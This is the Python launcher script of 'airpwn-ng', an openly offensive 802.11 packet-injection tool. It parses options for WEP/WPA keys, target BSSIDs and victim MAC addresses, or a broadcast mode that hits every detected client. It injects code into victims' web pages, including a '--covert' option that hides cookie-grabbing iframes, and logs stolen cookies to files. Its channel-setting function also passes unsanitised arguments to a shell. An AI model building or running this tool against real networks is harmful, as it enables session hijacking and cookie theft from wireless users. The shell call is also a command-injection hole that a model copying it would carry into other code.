#! /usr/bin/python2.7

import argparse
import logging
import os
#import pysnooper                                                               ## Uncomment to use pysnooper tracing
import signal
import subprocess
import sys
from lib.logger import Database, Tee as tee
from lib.styles import File, List
from lib.visuals import Bcolors

def channelSet(nic, chan):
    """Set the channel for a given NIC"""
    subprocess.call('iwconfig {0} channel {1}'.format(nic, chan), shell = True)

def crtlC(args):
    """Handle CTRL+C."""
    def tmp(signal, frame):
        print (Bcolors.FAIL + '\n[!] Stopping injection and exiting airpwn-ng ...' + Bcolors.ENDC)
        print (Bcolors.OKGREEN + '\n[+] Cookies stored to ' + Bcolors.WARNING + 'cookies.log ' + Bcolors.OKGREEN +  'and ' + Bcolors.WARNING + 'cookies.sqlite' + Bcolors.ENDC)
        if args.l:
            print (Bcolors.OKGREEN + '\n[+] Output log stored to ' + Bcolors.WARNING + '{0}'.format(str(args.l)) + Bcolors.ENDC)
        sys.exit(0)
    return tmp


def injection_check(args):
    """Injection file -OR- Website list decision logic"""
    if args.injection:
        try:
            f = open(args.injection, 'r')
            f.close()
        except:
            print (Bcolors.FAIL + '[!] Selected injection file', args.injection, 'does not exist.' + Bcolors.ENDC)
            exit(1)
        print (Bcolors.OKGREEN + '[+] Loaded injection file {0}'.format(str(args.injection)) + Bcolors.ENDC)
        injection = 1
        websites = None
        return injection, websites

    ### Jack64, Verify this is what you want
    elif args.websites:
        try:
            f = open(args.websites, 'r')
            f.close()
        except IOError:
            print (Bcolors.FAIL + '[!] Selected websites file', args.websites, 'does not exist.' + Bcolors.ENDC)
            sys.exit(1)
        except:
            raise

        injection = 0
        websites = load_websites_targeted(args.websites)
        for website in websites:
            print (Bcolors.OKGREEN + '[+] Loaded target website ', website + Bcolors.ENDC)
        return injection, websites


### Make this simplistic with import re
def load_websites_targeted(websites_file):
    """Load websites from a file to a List object.

    Ignore lines starting with #.
    """
    websites = []
    with open(websites_file, 'r') as f:
        lines = f.read().splitlines()
    for i in lines:
        if len(i) != 0:
            if i[0] != '#':
                websites.append(i.strip())
    return websites

#@pysnooper.snoop('./air.log')             ## Uncomment to use pysnooper tracing
def main(args):
    """Launching logic"""

    ## Logging
    if args.l is not None:
        stdOut = sys.stdout
        sys.stdout = sys.stderr
        sys.stderr = stdOut
        oLog = open(args.l, 'w')
        sys.stdout = tee(stdOut, oLog)

    ## Cookie extractor
    if args.cm is not None:
        db = Database(args.cm)
        db.cookieExtractor()
        exit(0)

    ## Enforce BSSID if WEP is chosen
    if args.wep is not None and args.bssid is None:
        print ('--wep requires --bssid\n')
        sys.exit(1)

    ## Enforce BSSID and ESSID if WPA is chosen
    if args.wpa is not None and (args.bssid is None or args.essid is None):
        print ('--wpa requires --bssid and --essid\n')
        sys.exit(1)

    ## Lowercase BSSID
    if args.bssid is not None:
        args.bssid = args.bssid.lower()

    ## Packet size
    ## Observed packet lengths for a GET /
    ## Can change depending upon NIC
    ## Defaults have been set 4 bytes lower as a precaution
    ## Adjust based according to your needs, or use -s 0
    ## WPA TKIP  -- 216
    ## WPA AES   -- 212
    ## WPA2 TKIP -- 216
    ## WPA2 AES  -- 212
    ## WEP       -- 204
    ## Open      -- 196

    if args.wpa is not None:
        if args.s is None:
            args.s = 208
    elif args.wep is not None:
        if args.s is None:
            args.s = 200
        else:
            args.s = int(args.s)
    else:
        if args.s is None:
            args.s = 192
        else:
            args.s = int(args.s)

    ## NIC types
    if args.inj is None:
        args.inj = 'mon'
    if args.mon is None:
        args.mon = 'mon'

    ## Force websites if covert
    ### Decide if we want this as default behavior
    if args.covert is not False and args.websites is None:
        print ('--covert requires --websites')
        sys.exit(1)

    ## User printouts
    print ('\nairpwn-ng - The new and improved 802.11 packet injector\n')

    ### Add error checks
    ## Set channel if so desired
    if args.channel is not None:
        print (Bcolors.OKGREEN + '[+] Setting NIC Channel(s) to %s' % args.channel + Bcolors.ENDC)

        ## Set monitor nic
        if args.mon == 'mon':
            channelSet(args.m, args.channel)

        ## Set injector nic
        if args.inj == 'mon':
            channelSet(args.i, args.channel)

    ### NOT IMPLEMENTED YET
    ## Whitelist checks
    #if args.exclude_hosts is not None:
        #EXCLUSION = 1
        #EXCLUDE_LIST = args.exclude_hosts

    ## Injection Logic
    injection = 0
    injection, websites = injection_check(args)

    if args.t is None:
        ## Broadcast mode
        print (Bcolors.WARNING + '[!] You are starting your attack in broadcast mode.')
        print ('[!] This means you will inject packets into all clients you are able to detect.')
        print ('[!] Use with caution.' + Bcolors.ENDC)
    else:
        ## Targeted mode
        if len(args.t) == 0:
            print (Bcolors.WARNING + '[!] You must specify at least one target MAC address with -t for targeted mode')
            exit(1)
        else:
            for target in args.t:
                print (Bcolors.OKGREEN + '[+] Adding target ' + Bcolors.OKBLUE + target + Bcolors.ENDC)

    ## List of domains used
    if injection == 0:
        style = List()

    ## Injection file used
    elif injection == 1:
        style = File()

    ## Launch the handler
    style.handler(args, websites)


if __name__ == '__main__':
    ## ARGUMENT PARSING
    parser = argparse.ArgumentParser(description = 'airpwn-ng - the new and improved 802.11 packet injector')
    group = parser.add_mutually_exclusive_group(required = True)

    group.add_argument('--cm',
                       metavar = '<filename>',
                       help = 'Extract cookies from the DB')
    group.add_argument('--injection',
                       metavar = '<filename>',
                       help = 'File with your injection code')
    group.add_argument('--websites',
                       metavar = '<filename>',
                       help = 'List of websites to sniff cookies from')

    parser.add_argument('-b',
                        action = 'store_true',
                        help = 'Sniff both ways')
    parser.add_argument('-i',
                        metavar = '<interface>',
                        help = 'Your injection interface')
    parser.add_argument('-l',
                        metavar = '<outfile>',
                        help = 'Logfile')
    parser.add_argument('-m',
                        metavar = '<interface>',
                        help = 'Your monitor interface')
    parser.add_argument('-s',
                        metavar = '<pkt size>',
                        help = 'minimum size packet to decipher')
    parser.add_argument('-t',
                        nargs = '*',
                        metavar = '<MAC address>',
                        help = 'Target MAC addresses')
    parser.add_argument('--bssid',
                        metavar = '<tgt BSSID>',
                        help = 'Target BSSID')
    parser.add_argument('--channel',
                        metavar = '<channel>',
                        help = 'Set the channel for the NICs')
    parser.add_argument('--covert',
                        action = 'store_true',
                        help = 'Hides cookie grabbing iframes inside the requested page')
    parser.add_argument('--essid',
                        metavar = '<tgt ESSID>',
                        help = 'Target ESSID')
    parser.add_argument('--exclude-hosts',
                        nargs = '*',
                        metavar = '<host>',
                        help = 'Space separated list of hosts/IP addresses to exclude from injection')
    parser.add_argument('--inj',
                        choices = ['mon', 'man'],
                        metavar = '<inj NIC type>',
                        help = 'Injector NIC type - mon or man')
    parser.add_argument('--mon',
                        choices = ['mon', 'man'],
                        metavar = '<mon nic type>',
                        help = 'Monitor NIC type - mon or man')
    parser.add_argument('--single',
                        action = 'store_true',
                        help = 'Single packet injection attempt')
    parser.add_argument('--trigger',
                        metavar = '<trigger>',
                        help = 'Trigger string for injection')
    parser.add_argument('--wep',
                        metavar = '<wep password>',
                        help = 'Password for WEP')
    parser.add_argument('--wpa',
                        metavar = '<wpa password>',
                        help = 'Password for WPA')
    args = parser.parse_args()

    ## ADD SIGNAL HANDLER
    signal_handler = crtlC(args)
    signal.signal(signal.SIGINT, signal_handler)

    ## Launch
    main(args)
